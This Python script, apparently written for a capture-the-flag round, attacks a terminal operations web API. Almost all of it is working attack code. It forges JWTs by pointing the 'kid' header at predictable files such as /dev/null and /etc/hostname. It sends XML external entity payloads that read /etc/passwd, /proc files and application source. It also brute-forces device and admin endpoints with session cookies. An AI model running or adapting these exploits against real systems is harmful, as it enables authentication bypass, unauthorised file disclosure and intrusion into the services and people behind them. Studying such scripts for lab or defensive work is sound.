#!/usr/bin/env python3
"""round70 — FIXED extract_xxe (summary not ticket) + /etc/hosts + portal + kid verify"""
import requests, json, time, hashlib, hmac as hm, base64

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read_raw(path, field="remarks", timeout=10):
    """Returns raw response text"""
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

def extract_xxe(path, field="remarks", timeout=10):
    """FIXED: checks both 'summary' and 'ticket' keys"""
    code, text = xxe_read_raw(path, field, timeout)
    if code == 200:
        try:
            data = json.loads(text)
            # Try both response formats
            container = data.get("summary", data.get("ticket", {}))
            val = container.get(field, "")
            return code, val
        except:
            return code, text
    return code, text

# ============================================================
print("="*70)
print("PHASE 1: VERIFY FIX — READ KNOWN FILE")
print("="*70)

# Read requirements.txt — we KNOW it has content
code, raw = xxe_read_raw("/app/requirements.txt")
print(f"  Raw response: [{code}] {raw[:500]}")

code, val = extract_xxe("/app/requirements.txt")
print(f"\n  Extracted: [{code}] '{val[:200]}'")
if val:
    print(f"  *** FIX WORKS! Got {len(val)} bytes ***")
else:
    print(f"  *** Still empty — trying other fields ***")
    for field in ["reference", "carrier"]:
        code2, val2 = extract_xxe("/app/requirements.txt", field=field)
        print(f"    field={field}: [{code2}] '{val2[:200]}'")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: READ SYSTEM FILES (FIXED)")
print("="*70)

files = [
    "/etc/hosts",
    "/etc/passwd",
    "/etc/resolv.conf",
    "/etc/hostname",
    "/etc/environment",
    "/proc/self/cgroup",
    "/proc/self/status",
    "/proc/version",
    "/proc/self/net/route",
]

for path in files:
    code, val = extract_xxe(path)
    if code == 200 and val:
        lines = val.split('\n')
        print(f"\n  {path} ({len(val)} bytes, {len(lines)} lines):")
        for line in lines[:25]:
            print(f"    {line}")
        if len(lines) > 25:
            print(f"    ... ({len(lines)-25} more lines)")
        # Highlight interesting content
        for kw in ['gauge', 'probe', '172.18.0.4', 'secret', 'flag']:
            if kw in val.lower():
                print(f"    *** Contains '{kw}'! ***")
    elif code == 200:
        pass  # Empty = doesn't exist
    elif code == 400:
        print(f"  {path}: EXISTS (special chars)")
    elif code == -1:
        print(f"  {path}: TIMEOUT")
    else:
        print(f"  {path}: [{code}]")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: KID ORACLE — VERIFY /etc/hostname")
print("="*70)
print("  If hostname = '5407f6317f5c\\n', kid oracle returns 200")

# Read hostname via XXE first
code, hostname_val = extract_xxe("/etc/hostname")
print(f"  XXE /etc/hostname: '{hostname_val}'")

# Test kid oracle with various hostname values
candidates = [
    "5407f6317f5c",
    "5407f6317f5c\n",
    "5407f6317f5cb1c5e178d2edd9fe960f73126e60833d9c1f297d13d9ddeb1e75",
    "5407f6317f5cb1c5e178d2edd9fe960f73126e60833d9c1f297d13d9ddeb1e75\n",
]

if hostname_val:
    candidates.insert(0, hostname_val)
    candidates.insert(1, hostname_val + "\n")
    candidates.insert(2, hostname_val.strip())
    candidates.insert(3, hostname_val.strip() + "\n")

for c in candidates:
    key = c.encode('utf-8')
    token = jwt_forged(role="operator", kid="/etc/hostname", key=key)
    try:
        r = S.get(f"{CASPI}/api/auth/me",
                 headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            print(f"  *** kid=/etc/hostname VERIFIED: {c!r} ***")
            break
        else:
            print(f"  kid=/etc/hostname key={c!r}: [{r.status_code}]")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: KID ORACLE — VERIFY /etc/resolv.conf")
print("="*70)

code, resolv = extract_xxe("/etc/resolv.conf")
print(f"  XXE /etc/resolv.conf: '{resolv}'")

if resolv:
    for suffix in ['', '\n']:
        key = (resolv + suffix).encode('utf-8')
        token = jwt_forged(role="operator", kid="/etc/resolv.conf", key=key)
        try:
            r = S.get(f"{CASPI}/api/auth/me",
                     headers={"Authorization": f"Bearer {token}"}, timeout=5)
            if r.status_code == 200:
                print(f"  *** VERIFIED resolv.conf (suffix={suffix!r}) ***")
                break
            else:
                print(f"  resolv.conf (suffix={suffix!r}): [{r.status_code}]")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: LOGIN + PORTAL ACCESS (session cookies)")
print("="*70)

# Fresh session for clean cookies
S2 = requests.Session()

# Login
try:
    r = S2.post(f"{CASPI}/api/auth/login",
               json={"email": "ctf_fubznz@caspiterminal.kz", "password": "Ctffubznz2026!"},
               timeout=5)
    print(f"  Login: [{r.status_code}] {r.text[:200]}")
    print(f"  Cookies: {dict(S2.cookies)}")

    # Try portal-like URLs with session cookies
    portal_paths = [
        "/portal", "/portal/", "/partner", "/partner/",
        "/dashboard", "/dashboard/", "/home",
        "/app", "/panel", "/account", "/profile",
        "/tickets", "/orders", "/bookings",
        "/loading", "/schedule", "/custody",
        "/api/ops", "/api/ops/",
        "/api/ops/custody", "/api/ops/custody/",
        "/api/ops/custody/list", "/api/ops/custody/tickets",
        "/api/ops/probe", "/api/ops/probe/",
        "/api/ops/probe/sign", "/api/ops/probe/devices",
        "/api/ops/probe/list",
        "/api/ops/tanks", "/api/ops/meters",
        "/api/ops/flow", "/api/ops/levels",
        "/api/admin", "/api/admin/",
        "/api/users", "/api/me",
    ]

    for path in portal_paths:
        try:
            r2 = S2.get(f"{CASPI}{path}", timeout=5, allow_redirects=False)
            if r2.status_code in [200, 301, 302, 303]:
                text = r2.text[:500]
                print(f"\n  [{r2.status_code}] GET {path}:")
                if 'Location' in r2.headers:
                    print(f"    Redirect: {r2.headers['Location']}")
                if r2.status_code == 200 and len(r2.text) > 50:
                    print(f"    Body ({len(r2.text)} bytes): {text[:400]}")
                    import re
                    apis = re.findall(r'/api/[a-zA-Z0-9/_?=-]+', text)
                    hrefs = re.findall(r'href=["\']([^"\']+)["\']', text)
                    if apis: print(f"    APIs: {apis}")
                    if hrefs: print(f"    Links: {hrefs}")
        except:
            pass

    # Try POST methods on interesting paths
    for path in ["/api/ops/probe/sign", "/api/ops/custody/list",
                 "/api/ops/custody/tickets"]:
        try:
            r3 = S2.post(f"{CASPI}{path}", json={}, timeout=5)
            if r3.status_code not in [404, 405]:
                print(f"\n  [{r3.status_code}] POST {path}: {r3.text[:300]}")
        except:
            pass

except Exception as e:
    print(f"  Login error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: PROBE/SIGN — TRY ALL POSSIBLE DEVICE NAMES")
print("="*70)
print("  Known: lm-01, tk-01, tk-02, tk-03, tk-07")
print("  What about tk-04, tk-05, tk-06, tk-08, lm-02, etc.?")

for prefix in ["tk-", "lm-", "pm-", "fl-", "gw-", "sv-"]:
    for num in range(0, 20):
        device = f"{prefix}{num:02d}"
        try:
            r = S.get(f"{CASPI}/api/ops/probe/sign", params={"device": device},
                     headers=AUTH_OP, timeout=3)
            if r.status_code == 200:
                data = r.json()
                url = data.get("url", "")
                sig = data.get("sig", "")
                print(f"  *** NEW DEVICE: {device} ***")
                print(f"    URL: {url}")
                print(f"    Sig: {sig}")
        except:
            pass

# Also try common device names
for device in ["admin", "config", "debug", "test", "secret", "flag",
               "shell", "llehs", "probe", "gateway", "gauge",
               "meter-1", "tank-1", "arm-1", "valve-1",
               "localhost", "127.0.0.1", "172.18.0.4", "172.18.0.5",
               "self", "internal", "0", "1", "null"]:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign", params={"device": device},
                 headers=AUTH_OP, timeout=3)
        if r.status_code == 200:
            data = r.json()
            print(f"  *** DEVICE '{device}': {data} ***")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: READ /etc/hosts FOR GAUGE-GW & 172.18.0.4 MAPPING")
print("="*70)
print("  Re-reading with raw output to debug extraction")

code, raw = xxe_read_raw("/etc/hosts")
print(f"  /etc/hosts raw: [{code}] {raw[:1000]}")

code, raw = xxe_read_raw("/etc/passwd")
print(f"\n  /etc/passwd raw: [{code}] {raw[:1000]}")

code, raw = xxe_read_raw("/etc/resolv.conf")
print(f"\n  /etc/resolv.conf raw: [{code}] {raw[:1000]}")

code, raw = xxe_read_raw("/etc/hostname")
print(f"\n  /etc/hostname raw: [{code}] {raw[:500]}")

code, raw = xxe_read_raw("/proc/version")
print(f"\n  /proc/version raw: [{code}] {raw[:500]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: READ DEEPER PROC FILES")
print("="*70)

proc_files = [
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/proc/self/status",
    "/proc/self/net/route",
    "/proc/self/net/dev",
    "/proc/self/net/if_inet6",
    "/proc/self/schedstat",
    "/proc/self/sessionid",
    "/proc/self/loginuid",
    "/proc/self/oom_score",
    "/proc/self/oom_score_adj",
    "/proc/self/stat",
    "/proc/self/statm",
    "/proc/self/io",
    "/proc/self/limits",
    "/proc/uptime",
    "/proc/loadavg",
    "/proc/meminfo",
    "/proc/cpuinfo",
]

for path in proc_files:
    code, raw = xxe_read_raw(path)
    if code == 200:
        try:
            data = json.loads(raw)
            container = data.get("summary", data.get("ticket", {}))
            val = container.get("remarks", "")
            if val:
                lines = val.split('\n')
                print(f"\n  {path} ({len(val)} bytes):")
                for line in lines[:15]:
                    print(f"    {line}")
                if len(lines) > 15:
                    print(f"    ... ({len(lines)-15} more)")
        except:
            if raw:
                print(f"  {path}: [{code}] parse error: {raw[:200]}")
    elif code == 400:
        print(f"  {path}: EXISTS (special)")
    elif code == -1:
        print(f"  {path}: TIMEOUT")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: ALTERNATIVE — DIRECTLY READ app.py TRUNCATED")
print("="*70)
print("  Theory: if app.py starts with imports/vars before first '<',")
print("  the text BEFORE '<' appears as element text content,")
print("  and the '<' starts a child element (possibly invalid → 400)")
print()
print("  Try reading app.py in different fields to see if any give partial content")

for field in ["remarks", "reference", "carrier"]:
    code, raw = xxe_read_raw("/app/app.py", field=field)
    print(f"  app.py via {field}: [{code}] {raw[:300]}")

# Also try auth.py
for field in ["remarks", "reference"]:
    code, raw = xxe_read_raw("/app/auth.py", field=field)
    print(f"  auth.py via {field}: [{code}] {raw[:300]}")

# Try entrypoint.sh
for field in ["remarks", "reference"]:
    code, raw = xxe_read_raw("/app/entrypoint.sh", field=field)
    print(f"  entrypoint.sh via {field}: [{code}] {raw[:300]}")

print("\n"+"="*70)
print("DONE")
print("="*70)
